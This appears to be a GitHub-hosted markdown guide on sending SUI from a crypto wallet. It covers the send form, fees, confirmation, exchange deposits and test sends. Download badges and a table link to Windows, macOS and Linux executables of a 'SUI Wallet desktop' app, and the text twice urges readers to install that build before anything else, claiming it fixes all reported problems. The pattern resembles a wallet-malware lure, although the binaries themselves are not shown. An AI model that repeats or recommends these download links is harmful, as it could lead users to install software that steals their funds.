![SUI Wallet](assets/banner-article.png)

# How to send SUI from your wallet

Address, amount, fee, approval: the four things to check before a transfer leaves.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

A send is an address, an amount and a fee, confirmed in a window that shows all three before you sign. The
fee is paid in SUI, the destination has to be the recipient's own address, and once a transaction is
included it cannot be recalled. Check the address twice and send a small amount first.

## The send form, field by field

The form asks for the recipient's address and an amount, and it shows the fee before you commit. Two
fields, one number you did not choose - and the number you did not choose is the one worth understanding
before the first send.

Paste the address rather than typing it. A pasted address can still be wrong, but a typed one can be wrong
in a way nobody notices: one character different, still valid, and pointing at somebody else.

## The confirmation window

Before the transaction is signed, the app previews its effect in human-readable terms: what leaves the account, how much, and where it goes. That preview is the last point at which a mistake is free, and it is the only screen worth slowing down for.

Read it against the thing you meant to do. If the amount differs from the amount you typed, stop. If the
destination is an address you do not recognise, stop. Approving the preview is the act that moves funds;
everything before it is reversible.

## The fee and who pays it

The fee is paid in SUI by the account sending the transaction, and it is shown before you sign. There is no separate invoice and no second asset involved: the wallet states the fee asset, and the fee asset is SUI.

A balance that is entirely staked leaves nothing spendable for the fee. Leave a working balance in the
account, and the fee stops being a surprise the day you need to move something quickly. [SUI Wallet transaction fees explained](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-transaction-fees-explained.md) covers what makes one transaction cost more than
another.

## Pending versus failed

Pending means the network has the transaction and has not yet included it. Failed means it will not be included at all - a different outcome from one still waiting, and that difference decides whether you should wait or act instead.

The current release separates the three cases that look alike from the outside - stale provider data, a
network stall, and a local permission problem - instead of showing one spinner for all of them. If a
transaction sits longer than expected, install the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) before
concluding anything: the reported problems are fixed there, and the older build is where the ambiguous
state comes from.

[Why is my Sui transaction pending?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/why-is-my-sui-transaction-pending.md) takes each of the three apart and says which one you are
looking at.

## Sending to an exchange address

An exchange deposit address is not a wallet you control. It is a label on the exchange's own account, and the exchange credits you when it sees the transfer - which means the network field matters more than usual, and the first send should be small.

Send on the network the exchange names. A transfer that arrives on a different network is not a transfer
the exchange can credit, and recovering it is a support request rather than a transaction. The first send
to any exchange should be small for exactly this reason.

Some exchanges also require a memo or a tag with the deposit. That is the exchange's routing information,
not the wallet's: the wallet's job is the address, the amount and the fee.

## The first small test send

Send a small amount to a new address, confirm it arrives, then send the rest. Two transactions instead of one, and the second only happens after the first proved the address works - which is cheaper than discovering the mistake with the full balance.

This matters most for a fresh address, an exchange deposit, or anything copied from a message rather than
from the recipient's own screen. It is the cheapest insurance in the whole product.
[Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers the other side of that test: what the recipient sees and
when.

## What a send never needs

It does not need the 24 words, a support agent, a second approval from anyone, or a "verification" transfer
to an address somebody gave you in a chat. Those requests are the shape of a scam, not of a transaction.

A send needs the address, the amount, and the fee. Anything else being asked for is a reason to stop.

## FAQ

### How do I send SUI and what does the confirmation screen show?

It shows the amount, the destination and the fee in SUI before you sign. Approving it is the transaction;
declining costs nothing.

### Can I send to a brand-new address?

Yes. A new address is a normal address; it simply has no history. Send a small amount first if the address
came from someone else.

### Does SUI Wallet accept USDC?

The send form moves what the account holds, and the fee is paid in SUI whichever asset you move. A token
you have never received is not in the account to send.

### How do I move SUI to another wallet?

Get that wallet's address, paste it into the send form here, enter the amount, check the preview, and
approve. The other wallet needs nothing from you but the address.

### Why is there a minimum transfer warning?

Because an amount small enough to be swallowed by the fee leaves nothing to send. Increase the amount or
wait until the balance covers both.

### What happens if I send to the wrong address?

The transaction completes and the funds belong to whoever holds that address. There is no reversal, which
is why the preview and the small test send exist.
